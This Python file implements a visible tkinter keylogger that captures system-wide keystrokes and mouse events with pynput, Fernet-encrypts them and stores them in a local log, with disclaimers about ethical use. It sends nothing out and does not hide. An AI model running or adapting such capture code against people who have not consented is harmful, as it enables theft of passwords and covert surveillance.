import tkinter as tk
from tkinter import scrolledtext, messagebox
from tkinter import simpledialog
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet
import os


class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Basic Keylogger")
        self.root.geometry("600x600")

        # Disclaimer pop-up on startup
        self.show_disclaimer()

        # Disclaimer text at the top of the window
        self.disclaimer_label = tk.Label(self.root,
                                         text="Disclaimer: This tool is intended for ethical and legal use only.\nPlease use responsibly.",
                                         font=("Arial", 10), fg="red", wraplength=550)
        self.disclaimer_label.pack(pady=10)

        # Text box to display logs
        self.log_display = scrolledtext.ScrolledText(self.root, wrap=tk.WORD, width=70, height=20)
        self.log_display.pack(padx=10, pady=10)

        # Buttons to start and stop the keylogger
        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        # Buttons to view the encrypted and decrypted log files
        self.view_encrypted_button = tk.Button(self.root, text="View Encrypted Log", command=self.view_encrypted_log)
        self.view_encrypted_button.pack(pady=5)

        self.view_decrypted_button = tk.Button(self.root, text="View Decrypted Log", command=self.view_decrypted_log)
        self.view_decrypted_button.pack(pady=5)

        # Set up encryption key
        self.key = self.load_key()

    def show_disclaimer(self):
        messagebox.showinfo("Disclaimer",
                            "This tool is intended for ethical and legal use only. Please use responsibly. \n"
                            "Unauthorized use of this tool for malicious purposes is illegal and unethical.\n\n"
                            "By using this tool, you agree to comply with all applicable laws and ethical standards.")

    def start_keylogger(self):
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log_display.insert(tk.END, "Keylogger started...\n")
        self.keylogger_listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.mouse_listener = MouseListener(on_move=self.on_move, on_click=self.on_click)

        self.keylogger_listener.start()
        self.mouse_listener.start()

    def stop_keylogger(self):
        self.keylogger_listener.stop()
        self.mouse_listener.stop()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log_display.insert(tk.END, "Keylogger stopped.\n")

    def on_press(self, key):
        log_message = f"Key pressed: {key}"
        self.log_message(log_message)

    def on_release(self, key):
        if key == Key.esc:
            self.stop_keylogger()

    def on_move(self, x, y):
        log_message = f"Mouse moved to ({x}, {y})"
        self.log_message(log_message)

    def on_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        log_message = f"Mouse {action} at ({x}, {y}) with {button}"
        self.log_message(log_message)

    def log_message(self, message):
        encrypted_message = self.encrypt_log_data(message)
        with open("keylog_encrypted.log", "ab") as f:
            f.write(encrypted_message + b"\n")
        self.log_display.insert(tk.END, f"Encrypted: {encrypted_message.decode()}\n")
        self.log_display.yview(tk.END)

    def load_key(self):
        if os.path.exists("key.key"):
            with open("key.key", "rb") as key_file:
                return key_file.read()
        else:
            return self.generate_key()

    def generate_key(self):
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
        return key

    def encrypt_log_data(self, log_data):
        cipher_suite = Fernet(self.key)
        return cipher_suite.encrypt(log_data.encode())

    def view_encrypted_log(self):
        log_path = "keylog_encrypted.log"
        if not os.path.exists(log_path):
            messagebox.showerror("Error", "Encrypted log file not found!")
            return

        with open(log_path, "rb") as f:
            encrypted_content = f.readlines()

        self.log_display.delete(1.0, tk.END)  # Clear the display
        self.log_display.insert(tk.END, "Encrypted Log Data:\n")
        for encrypted_line in encrypted_content:
            self.log_display.insert(tk.END, encrypted_line.decode() + "\n")

    def view_decrypted_log(self):
        key_path = "key.key"
        log_path = "keylog_encrypted.log"

        if not os.path.exists(key_path):
            messagebox.showerror("Error", "Encryption key not found!")
            return

        if not os.path.exists(log_path):
            messagebox.showerror("Error", "Encrypted log file not found!")
            return

        key = self.load_key()
        cipher_suite = Fernet(key)

        try:
            with open(log_path, "rb") as f:
                encrypted_content = f.readlines()
                self.log_display.delete(1.0, tk.END)  # Clear the display
                self.log_display.insert(tk.END, "Decrypted Log Data:\n")
                for encrypted_line in encrypted_content:
                    try:
                        decrypted_line = cipher_suite.decrypt(encrypted_line.strip()).decode()
                        self.log_display.insert(tk.END, decrypted_line + "\n")
                    except Exception as e:
                        self.log_display.insert(tk.END, f"Error decrypting a line: {e}\n")
        except Exception as e:
            messagebox.showerror("Error", f"Error reading log file: {e}")


if __name__ == "__main__":
    root = tk.Tk()
    keylogger_gui = KeyloggerGUI(root)
    root.mainloop()
